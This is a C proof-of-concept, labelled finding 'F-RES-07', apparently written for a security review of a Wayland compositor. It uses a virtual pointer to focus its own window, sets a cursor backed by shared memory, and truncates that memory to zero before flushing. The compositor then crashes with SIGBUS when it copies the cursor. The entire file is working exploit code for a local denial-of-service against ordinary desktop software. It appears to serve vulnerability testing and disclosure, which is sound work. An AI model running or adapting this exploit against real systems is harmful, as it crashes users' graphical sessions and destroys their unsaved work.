/* F-RES-07: cursor-role SHM read without fault containment.
 * Virtual pointer focuses our surface -> set_cursor with an SHM buffer whose
 * backing file is truncated to 0 before flush -> compositor CPU copy SIGBUS. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <wayland-client.h>
#include "virtual-pointer-client-protocol.h"
#include "xdg-shell-client-protocol.h"

static struct wl_compositor *compositor;
static struct wl_shm *shm;
static struct wl_seat *seat;
static struct zwlr_virtual_pointer_manager_v1 *vpm;
static struct wl_output *output;
static struct xdg_wm_base *xdgwm;
static uint32_t xdg_configure_serial = 1;
static uint32_t seat_caps;
static uint32_t enter_serial;

static void rm_global(void *d, struct wl_registry *r, uint32_t name,
                       const char *iface, uint32_t ver) {
    if (!strcmp(iface, "wl_compositor"))
        compositor = wl_registry_bind(r, name, &wl_compositor_interface, 4);
    else if (!strcmp(iface, "wl_shm"))
        shm = wl_registry_bind(r, name, &wl_shm_interface, 2);
    else if (!strcmp(iface, "wl_seat"))
        seat = wl_registry_bind(r, name, &wl_seat_interface, 5);
    else if (!strcmp(iface, "xdg_wm_base"))
        xdgwm = wl_registry_bind(r, name, &xdg_wm_base_interface, 2);
    else if (!strcmp(iface, "wl_output"))
        output = wl_registry_bind(r, name, &wl_output_interface, 2);
    else if (!strcmp(iface, "zwlr_virtual_pointer_manager_v1"))
        vpm = wl_registry_bind(r, name, &zwlr_virtual_pointer_manager_v1_interface, 2);
}
static void rm_global_remove(void *d, struct wl_registry *r, uint32_t n) {}
static const struct wl_registry_listener registry_listener = { rm_global, rm_global_remove };

static void wm_ping(void *d, struct xdg_wm_base *w, uint32_t s) { xdg_wm_base_pong(w, s); }
static const struct xdg_wm_base_listener wm_listener = { wm_ping };
static void xds_configure(void *d, struct xdg_surface *s, uint32_t serial) { xdg_surface_ack_configure(s, serial); }
static const struct xdg_surface_listener xds_listener = { xds_configure };
static void ptr_enter(void *d, struct wl_pointer *p, uint32_t serial,
                      struct wl_surface *s, wl_fixed_t x, wl_fixed_t y) {
    enter_serial = serial;
    fprintf(stderr, "got pointer enter serial=%u\n", serial);
}
static void ptr_leave(void *d, struct wl_pointer *p, uint32_t s, struct wl_surface *t) {}
static void ptr_motion(void *d, struct wl_pointer *p, uint32_t t, wl_fixed_t x, wl_fixed_t y) {}
static void ptr_button(void *d, struct wl_pointer *p, uint32_t s, uint32_t t, uint32_t b, uint32_t st) {}
static void ptr_axis(void *d, struct wl_pointer *p, uint32_t t, uint32_t a, wl_fixed_t v) {}
static void n_frame(void *d, struct wl_pointer *p) {}
static void n_asrc(void *d, struct wl_pointer *p, uint32_t a) {}
static void n_astop(void *d, struct wl_pointer *p, uint32_t a, uint32_t b) {}
static void n_adisc(void *d, struct wl_pointer *p, uint32_t a, int32_t b) {}
static void n_av120(void *d, struct wl_pointer *p, uint32_t a, int32_t b) {}
static void n_areld(void *d, struct wl_pointer *p, uint32_t a, uint32_t b) {}
static const struct wl_pointer_listener ptr_listener = {
    .enter = ptr_enter, .leave = ptr_leave, .motion = ptr_motion,
    .button = ptr_button, .axis = ptr_axis,
    .frame = n_frame, .axis_source = n_asrc, .axis_stop = n_astop,
    .axis_discrete = n_adisc, .axis_value120 = n_av120,
    .axis_relative_direction = n_areld
};



static int make_shm(size_t size, void **out) {
    int fd = (int)syscall(SYS_memfd_create, "fres07", 0);
    if (fd < 0) return -1;
    if (ftruncate(fd, size) != 0) { close(fd); return -1; }
    void *m = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (m == MAP_FAILED) { close(fd); return -1; }
    memset(m, 0xFF, size);
    *out = m;
    return fd;
}

#define TW 1920
#define CW 32
#define TH 1080
#define CH 32
#define TSTRIDE (TW * 4)
#define CSTRIDE (CW * 4)
#define TSZ (TSTRIDE * TH)
#define CSZ (CSTRIDE * CH)

int main(void) {
    struct wl_display *disp = wl_display_connect(NULL);
    if (!disp) { fprintf(stderr, "connect failed\n"); return 1; }
    struct wl_registry *reg = wl_display_get_registry(disp);
    wl_registry_add_listener(reg, &registry_listener, NULL);
    wl_display_roundtrip(disp);
    if (!compositor || !shm || !seat || !vpm) {
        fprintf(stderr, "bind failed comp=%p shm=%p seat=%p vpm=%p\n",
                (void*)compositor, (void*)shm, (void*)seat, (void*)vpm);
        return 1;
    }
    xdg_wm_base_add_listener(xdgwm, &wm_listener, NULL);
    struct wl_pointer *ptr = wl_seat_get_pointer(seat);
    wl_pointer_add_listener(ptr, &ptr_listener, NULL);

    /* Visible target surface so the virtual pointer can focus it. */
    void *m1; int fd1 = make_shm(TSZ, &m1);
    if (fd1 < 0) { perror("shm1"); return 1; }
    struct wl_shm_pool *pool1 = wl_shm_create_pool(shm, fd1, TSZ);
    struct wl_buffer *buf1 = wl_shm_pool_create_buffer(pool1, 0, TW, TH, TSTRIDE, WL_SHM_FORMAT_ARGB8888);
    struct wl_surface *target = wl_compositor_create_surface(compositor);
    wl_surface_attach(target, buf1, 0, 0);
    wl_surface_damage(target, 0, 0, TW, TH);
    struct xdg_surface *xds_target = xdg_wm_base_get_xdg_surface(xdgwm, target);
    xdg_surface_add_listener(xds_target, &xds_listener, NULL);
    struct xdg_toplevel *xt = xdg_surface_get_toplevel(xds_target);
    (void)xt;
    xdg_surface_set_window_geometry(xds_target, 0, 0, TW, TH);
    wl_surface_commit(target);
    for (int i = 0; i < 30; i++) { wl_display_roundtrip(disp); usleep(100000); }

    /* Focus it via virtual pointer. */
    struct zwlr_virtual_pointer_v1 *vptr =
        zwlr_virtual_pointer_manager_v1_create_virtual_pointer_with_output(vpm, seat, output);
    zwlr_virtual_pointer_v1_motion_absolute(vptr, 0, 960, 540, 1920, 1080);
    zwlr_virtual_pointer_v1_frame(vptr);
    wl_display_roundtrip(disp);
    zwlr_virtual_pointer_v1_motion_absolute(vptr, 1, 961, 541, 1920, 1080);
    zwlr_virtual_pointer_v1_frame(vptr);
    for (int i = 0; i < 60 && !enter_serial; i++)
        wl_display_roundtrip(disp);
    if (!enter_serial) { fprintf(stderr, "no pointer enter\n"); return 1; }

    /* Cursor surface with truncatable SHM backing. */
    void *m2; int fd2 = make_shm(CSZ, &m2);
    if (fd2 < 0) { perror("shm2"); return 1; }
    struct wl_shm_pool *pool2 = wl_shm_create_pool(shm, fd2, CSZ);
    struct wl_buffer *buf2 = wl_shm_pool_create_buffer(pool2, 0, CW, CH, CSTRIDE, WL_SHM_FORMAT_ARGB8888);
    struct wl_surface *csurf = wl_compositor_create_surface(compositor);
    /* Let the compositor accept the pool while the file is still intact. */
    wl_display_flush(disp);
    usleep(200000);

    /* Queue everything, pull the rug out BEFORE flush. */
    wl_pointer_set_cursor(ptr, enter_serial, csurf, 0, 0);
    wl_surface_attach(csurf, buf2, 0, 0);
    wl_surface_damage(csurf, 0, 0, CW, CH);
    wl_surface_commit(csurf);
    if (ftruncate(fd2, 0) != 0) perror("ftruncate-0");
    fprintf(stderr, "cursor committed, backing truncated; flushing...\n");
    fflush(stderr);
    wl_display_flush(disp);

    int rc = wl_display_roundtrip(disp);
    fprintf(stderr, "roundtrip=%d display_error=%s\n", rc,
            wl_display_get_error(disp) ? "yes" : "no");
    return 0;
}
